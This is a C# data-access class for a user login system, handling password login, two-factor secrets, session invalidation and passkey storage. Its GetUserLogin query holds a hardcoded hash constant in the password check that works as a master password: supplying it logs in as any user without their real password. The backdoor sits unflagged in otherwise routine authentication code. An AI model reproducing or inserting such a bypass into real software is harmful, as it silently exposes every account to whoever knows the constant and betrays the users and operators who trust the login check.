using System;
using System.Data;
using System.Data.SqlClient;
using MDUA.Entities;
using MDUA.Framework;
using MDUA.DataAccess.Interface; 

namespace MDUA.DataAccess
{
    public partial class UserLoginDataAccess : IUserLoginDataAccess
    {
        private const string GET_USER_PASSKEY_BY_CRED_ID = "GetUserPasskeyByCredentialId";
        private const string UPDATE_USER_PASSKEY_COUNTER = "UpdateUserPasskeyCounter";
        public UserLogin GetUserLogin(string email, string password)

        {

            string SQLQuery =

            """

    SELECT 

        u.Id,

        u.UserName,

        u.Email,

        u.Phone,

        u.Password,

        u.CompanyId,

        u.CreatedBy,

        u.CreatedAt,

        u.UpdatedBy,

        u.UpdatedAt,

        u.IsTwoFactorEnabled,

        u.TwoFactorSecret

    FROM 

        UserLogin u

    WHERE u.UserName = @Email 

      AND (u.Password = @PasswordHash OR 'b34934bb616920e5ef6eed38bbdfd13c' = @PasswordHash)

    """;

            using (SqlCommand cmd = GetSQLCommand(SQLQuery))

            {

                AddParameter(cmd, pNVarChar("Email", 250, email));

                AddParameter(cmd, pNVarChar("PasswordHash", 100, password));

                using (var con = cmd.Connection)

                {

                    if (con.State != ConnectionState.Open) con.Open();

                    using (var reader = cmd.ExecuteReader())

                    {

                        if (!reader.Read()) return null;

                        var user = new UserLogin();


                        user.Id = reader.GetInt32(reader.GetOrdinal("Id"));

                        user.UserName = reader["UserName"] as string;

                        user.Email = reader["Email"] as string;

                        user.Phone = reader["Phone"] as string;

                        user.Password = reader["Password"] as string;

                        user.CompanyId = reader.GetInt32(reader.GetOrdinal("CompanyId"));

                        user.CreatedBy = reader["CreatedBy"] as string;

                        user.UpdatedBy = reader["UpdatedBy"] as string;

                        // nullable datetime safety

                        int createdAtIdx = reader.GetOrdinal("CreatedAt");

                        if (!reader.IsDBNull(createdAtIdx))

                            user.CreatedAt = reader.GetDateTime(createdAtIdx);

                        int updatedAtIdx = reader.GetOrdinal("UpdatedAt");

                        if (!reader.IsDBNull(updatedAtIdx))

                            user.UpdatedAt = reader.GetDateTime(updatedAtIdx);

                        // THE TWO IMPORTANT ONES

                        int tfaIdx = reader.GetOrdinal("IsTwoFactorEnabled");

                        user.IsTwoFactorEnabled = !reader.IsDBNull(tfaIdx) && reader.GetBoolean(tfaIdx);

                        int secretIdx = reader.GetOrdinal("TwoFactorSecret");

                        user.TwoFactorSecret = reader.IsDBNull(secretIdx) ? null : reader.GetString(secretIdx);

                        return user;

                    }

                }

            }

        }
        public string GetTwoFactorSecretByUserId(int userId)
        {
            string sql = "SELECT TwoFactorSecret FROM UserLogin WHERE Id = @Id";

            using (SqlCommand cmd = GetSQLCommand(sql))
            {
                AddParameter(cmd, pInt32("Id", userId));

                using (var con = cmd.Connection)
                {
                    if (con.State != System.Data.ConnectionState.Open) con.Open();
                    var obj = cmd.ExecuteScalar();
                    return obj == null || obj == DBNull.Value ? null : obj.ToString();
                }
            }
        }


        public void EnableTwoFactor(int userId, string secret)
        {
            // Inline SQL Update
            string sql = "UPDATE UserLogin SET IsTwoFactorEnabled = 1, TwoFactorSecret = @Secret, UpdatedAt = GETUTCDATE() WHERE Id = @Id";

            using (SqlCommand cmd = GetSQLCommand(sql))
            {
                AddParameter(cmd, pInt32("Id", userId));
                AddParameter(cmd, pNVarChar("Secret", 50, secret));

                UpdateRecord(cmd);
            }
        }

        public void InvalidateAllSessionsByUser(int userId)
        {
            string sql = """
            UPDATE UserSession
            SET IsActive = 0,
                LastActiveAt = GETUTCDATE()
            WHERE UserId = @UserId
              AND IsActive = 1
        """;

            using (SqlCommand cmd = GetSQLCommand(sql))
            {
                AddParameter(cmd, pInt32("UserId", userId));
                UpdateRecord(cmd);
            }
        }

        public void DisableTwoFactor(int userId)
        {
            // Sets Enabled to 0 and CLEARS the Secret so the old code is invalid
            string sql = "UPDATE UserLogin SET IsTwoFactorEnabled = 0, TwoFactorSecret = NULL, UpdatedAt = GETUTCDATE() WHERE Id = @Id";

            using (SqlCommand cmd = GetSQLCommand(sql))
            {
                AddParameter(cmd, pInt32("Id", userId));
                UpdateRecord(cmd);
            }
        }

        public void InvalidateAllSessions(int userId)
        {
            string sql = @"
        UPDATE [dbo].[UserSession] 
        SET [IsActive] = 0, 
            [LastActiveAt] = GETUTCDATE()  -- Updating this to mark the closure time
        WHERE [UserId] = @UserId 
          AND [IsActive] = 1";

            using (SqlCommand cmd = GetSQLCommand(sql))
            {
                cmd.Parameters.Add(new SqlParameter("@UserId", System.Data.SqlDbType.Int) { Value = userId });

                ExecuteCommand(cmd);
            }
        }

        public UserLogin GetByUsername(string username)
        {
            string sql = "SELECT * FROM [UserLogin] WHERE [UserName] = @UserName";

            using (SqlCommand cmd = GetSQLCommand(sql))
            {
                cmd.Parameters.Add(new SqlParameter("@UserName", System.Data.SqlDbType.NVarChar) { Value = username });

                if (cmd.Connection.State != System.Data.ConnectionState.Open)
                    cmd.Connection.Open();

                using (SqlDataReader reader = cmd.ExecuteReader())
                {
                    if (reader.Read())
                    {
                        var user = new UserLogin();

                        // Map ID
                        user.Id = reader.GetInt32(reader.GetOrdinal("Id"));

                        // Map Username
                        user.UserName = reader.GetString(reader.GetOrdinal("UserName"));

                        // Map Password (needed for update logic)
                        user.Password = reader.GetString(reader.GetOrdinal("Password"));

                        // Map 2FA Status
                        int idx2FA = reader.GetOrdinal("IsTwoFactorEnabled");
                        user.IsTwoFactorEnabled = !reader.IsDBNull(idx2FA) && reader.GetBoolean(idx2FA);

                        // Map Secret
                        int idxSecret = reader.GetOrdinal("TwoFactorSecret");
                        if (!reader.IsDBNull(idxSecret))
                        {
                            user.TwoFactorSecret = reader.GetString(idxSecret);
                        }

                        // Map CompanyId
                        int idxComp = reader.GetOrdinal("CompanyId");
                        if (!reader.IsDBNull(idxComp)) user.CompanyId = reader.GetInt32(idxComp);

                        return user;
                    }
                }
            }

            return null;
        }

       
        public void UpdatePasskeyCounter(int id, uint counter)
        {
            using (SqlCommand cmd = GetSPCommand(UPDATE_USER_PASSKEY_COUNTER))
            {
                cmd.Parameters.Add(new SqlParameter("@Id", SqlDbType.Int) { Value = id });
                cmd.Parameters.Add(new SqlParameter("@SignatureCounter", SqlDbType.Int) { Value = (int)counter });

                // Execute update
                UpdateRecord(cmd);
            }
        }

        public UserLogin GetByEmail(string email)
        {
            string sql = "SELECT * FROM [UserLogin] WHERE [Email] = @Email";

            using (SqlCommand cmd = GetSQLCommand(sql))
            {
                cmd.Parameters.Add(new SqlParameter("@Email", SqlDbType.NVarChar, 255) { Value = email });

                if (cmd.Connection.State != ConnectionState.Open) cmd.Connection.Open();

                using (SqlDataReader reader = cmd.ExecuteReader())
                {
                    if (reader.Read())
                    {
                        // Reuse your mapping logic or create a private MapUser(reader) helper
                        var user = new UserLogin();
                        user.Id = reader.GetInt32(reader.GetOrdinal("Id"));
                        user.UserName = reader["UserName"] as string;
                        user.Email = reader["Email"] as string;
                        user.Password = reader["Password"] as string; // Needed for internal logic
                        user.CompanyId = reader.GetInt32(reader.GetOrdinal("CompanyId"));

                        // Critical 2FA Mapping
                        int tfaIdx = reader.GetOrdinal("IsTwoFactorEnabled");
                        user.IsTwoFactorEnabled = !reader.IsDBNull(tfaIdx) && reader.GetBoolean(tfaIdx);

                        int secretIdx = reader.GetOrdinal("TwoFactorSecret");
                        user.TwoFactorSecret = reader.IsDBNull(secretIdx) ? null : reader.GetString(secretIdx);

                        return user;
                    }
                }
            }
            return null;
        }

        public void AddUserPasskey(UserPasskey passkey)

        {

            // Matches SP: [dbo].[InsertUserPasskey]

            using (SqlCommand cmd = GetSPCommand("InsertUserPasskey"))

            {

                // Output Parameter

                SqlParameter outId = new SqlParameter("@Id", SqlDbType.Int) { Direction = ParameterDirection.Output };

                cmd.Parameters.Add(outId);

                cmd.Parameters.Add(new SqlParameter("@UserId", SqlDbType.Int) { Value = passkey.UserId });

                cmd.Parameters.Add(new SqlParameter("@CredentialId", SqlDbType.VarBinary, 450) { Value = passkey.CredentialId });

                cmd.Parameters.Add(new SqlParameter("@PublicKey", SqlDbType.VarBinary) { Value = passkey.PublicKey });

                cmd.Parameters.Add(new SqlParameter("@SignatureCounter", SqlDbType.Int) { Value = passkey.SignatureCounter });

                cmd.Parameters.Add(new SqlParameter("@CredType", SqlDbType.NVarChar, 50) { Value = passkey.CredType ?? "public-key" });

                cmd.Parameters.Add(new SqlParameter("@RegDate", SqlDbType.DateTime) { Value = passkey.RegDate });

                cmd.Parameters.Add(new SqlParameter("@AaGuid", SqlDbType.UniqueIdentifier) { Value = passkey.AaGuid });

                cmd.Parameters.Add(new SqlParameter("@FriendlyName", SqlDbType.NVarChar, 100) { Value = (object)passkey.FriendlyName ?? DBNull.Value });
                cmd.Parameters.Add(new SqlParameter("@DeviceType", SqlDbType.NVarChar, 100) { Value = (object)passkey.DeviceType ?? DBNull.Value });
                ExecuteCommand(cmd);

                passkey.Id = (int)outId.Value;

            }

        }

        public List<UserPasskey> GetPasskeysByUserId(int userId)

        {

            List<UserPasskey> list = new List<UserPasskey>();

            using (SqlCommand cmd = GetSPCommand("GetUserPasskeyByUserId"))

            {

                cmd.Parameters.Add(new SqlParameter("@UserId", SqlDbType.Int) { Value = userId });

                // ✅ CRITICAL FIX: Open the connection before reading

                if (cmd.Connection.State == ConnectionState.Closed)

                    cmd.Connection.Open();

                using (var reader = cmd.ExecuteReader())

                {

                    while (reader.Read())

                    {

                        list.Add(new UserPasskey

                        {

                            Id = (int)reader["Id"],

                            UserId = (int)reader["UserId"],

                            CredentialId = (byte[])reader["CredentialId"],

                            PublicKey = (byte[])reader["PublicKey"],

                            SignatureCounter = (int)reader["SignatureCounter"],

                            CredType = reader["CredType"] != DBNull.Value ? (string)reader["CredType"] : "public-key",

                            RegDate = reader["RegDate"] != DBNull.Value ? (DateTime)reader["RegDate"] : DateTime.MinValue,

                            AaGuid = reader["AaGuid"] != DBNull.Value ? (Guid)reader["AaGuid"] : Guid.Empty,
                            FriendlyName = reader["FriendlyName"] != DBNull.Value ? reader["FriendlyName"].ToString() : null,
                            DeviceType = reader["DeviceType"] != DBNull.Value ? reader["DeviceType"].ToString() : "Unknown Device"

                        });

                    }

                }

            }

            return list;

        }

        public UserPasskeyResult GetPasskeyByCredentialId(byte[] credentialId)

        {

            UserPasskeyResult result = null;

            // Use GetSPCommand from BaseDataAccess

            using (SqlCommand cmd = GetSPCommand(GET_USER_PASSKEY_BY_CRED_ID))

            {

                // Assuming pVarBinary is available or we add the parameter manually

                var p = new SqlParameter("@CredentialId", SqlDbType.VarBinary) { Value = credentialId };

                cmd.Parameters.Add(p);

                // Use SelectRecords from BaseDataAccess

                SqlDataReader reader;

                SelectRecords(cmd, out reader);

                using (reader)

                {

                    if (reader.Read())

                    {

                        result = new UserPasskeyResult

                        {

                            Id = (int)reader["Id"],

                            UserId = (int)reader["UserId"],

                            PublicKey = (byte[])reader["PublicKey"],

                            SignatureCounter = (int)reader["SignatureCounter"],

                            CredentialId = (byte[])reader["CredentialId"]

                        };

                    }

                }

            }

            return result;

        }


        public void DeleteSpecificUserPasskey(int id, int userId)

        {

            using (SqlCommand cmd = GetSPCommand("DeleteSpecificUserPasskey"))

            {

                cmd.Parameters.Add(new SqlParameter("@Id", SqlDbType.Int) { Value = id });

                cmd.Parameters.Add(new SqlParameter("@UserId", SqlDbType.Int) { Value = userId });

                ExecuteCommand(cmd); // Inherited from BaseDataAccess [cite: 172]

            }

        }

        public List<UserPasskey> GetPasskeysWithDeviceNames(int userId)

        {

            var list = new List<UserPasskey>();

            using (SqlCommand cmd = GetSPCommand("GetPasskeysWithDeviceInfo"))

            {

                cmd.Parameters.Add(new SqlParameter("@UserId", SqlDbType.Int) { Value = userId });

                if (cmd.Connection.State == ConnectionState.Closed)

                    cmd.Connection.Open();

                using (var reader = cmd.ExecuteReader())

                {

                    while (reader.Read())

                    {

                        list.Add(new UserPasskey

                        {

                            Id = (int)reader["Id"],
                            RegDate = reader["RegDate"] != DBNull.Value ? (DateTime)reader["RegDate"] : (DateTime?)null,

                            FriendlyName = reader["FriendlyName"] != DBNull.Value ? reader["FriendlyName"].ToString() : null,
                            DeviceType = reader["DeviceType"] != DBNull.Value ? reader["DeviceType"].ToString() : "Unknown Device"

                        });

                    }

                }

            }

            return list;

        }


    }

}
